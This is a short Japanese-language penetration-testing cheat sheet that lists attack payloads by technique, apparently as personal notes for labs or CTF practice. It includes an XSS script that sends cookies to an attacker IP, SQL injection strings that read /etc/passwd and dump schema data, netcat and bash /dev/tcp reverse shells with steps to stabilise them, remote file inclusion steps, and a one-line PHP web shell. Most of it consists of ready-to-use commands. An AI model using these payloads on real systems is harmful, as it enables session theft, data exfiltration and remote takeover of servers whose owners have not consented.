# MyCheatSheet ver 1.0

* Decode ツール
  1. [CrackStation](https://crackstation.net/)
  2. [DenCode](https://dencode.com/ja/)
  3. [CyberChef](https://gchq.github.io/CyberChef/)
* XSS
  1. `'>"><hr>`を使用して水平線を表示
  2. `<script>alert(1)</script>`でアラート表示
  3. `<script>document.location="http://[ip address]/" + document.cookie</script>`でクッキーを外部に送信
* SQL Injection
  1. 入力値に`'`を入力してエラーの有無を検証
     1. エラーが帰らない場合もある。
     2. 表示されるエラーからドキュメントルート等のディレクトリ情報がある場合がある。
     3. `' union select version() ; #` でdbのバージョン表示  *MariaDB
     4. `' union select load_file('/etc/passwd'); #`　で`/etc/passwd`のファイル内を表示
     5. `' union select cloume_namefrom table_name into outfile '/data/mariadb/test.html' fields terminated by ',' optionally enclosed by '"'; #`でsqlの結果を/data/mariadb/test.htmlに出力(カンマ区切りで"で値を囲む)
     6. `' union select table_name,column_name from information_schema.columns; #` でテーブル名とカラム名を取得
* OS Command Injection
    1. 入力値のあとに`;ping -c 3 127.0.0.1`を入力して検証
* CSRF
    1. 正規のリクエストURLを使用してリンクを作成 (URL短縮サービス等を利用すると判別が困難になる。)
    2. 作成したリンクからリクエストが通るかを検証(Refererを検証)
    3. PoCジェネレーターを使用するとHTMLを簡単に作れる。
       [PoC Generator](https://security.love/CSRF-PoC-Genorator/)
* File Inclusion(Remote)
    1. クエリストリングにファイル名があるかを確認
    2. phpinfo()を実行させるphpファイルを作成
    3. ローカルでhttpサーバを立てる`python -m http.server 1030`
    4. 攻撃したいURLの`file=`にローカルのphpファイルのパスを記述
* File Inclusion(Local)
    1. ファイルアップロード時にファイルパスを確認できるかを検証
* 遠隔からのシェル
  * ファイアウォールでインバウンド通信で接続とポートが許可されている場合はバインドシェルが可能
  * アウトバウンド通信は許可されている場合が多いためリバースシェルはファイアウォールを回避しやすい。
  * バインドシェル・リバースシェル netcatを使用
    1. 待ち受け　`nc -vlp 1027`
    2. 接続     `nc -v 192.168.XXX.XXX 1027 -e /bin/bash` (/bin/bashのところはwindowsならcmd.exe)
    3. ncがない場合の接続
       1. `bash -i >& /dev/tcp/[IPアドレス/[ポート番号] 0>&1`
       2. `bash -c 'bash -i >& /dev/tcp/[IPアドレス/[ポート番号] 0>&1'`
    4. シェルの安定化
       1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
       2. `Ctrl-z`
       3. `stty raw -echo; fg`
       4. `export SHELL=[your shell]`
       5. `export TERM=[your terminal]`
  * Webシェル
    1. 入力を待ち受けできるphpファイルを作成しFile Uploadの脆弱性を利用しアップロード
    2. アップしたphpファイルを利用してweb経由でコマンド実行
        `<?php system($_GET["cmd"]); ?>`
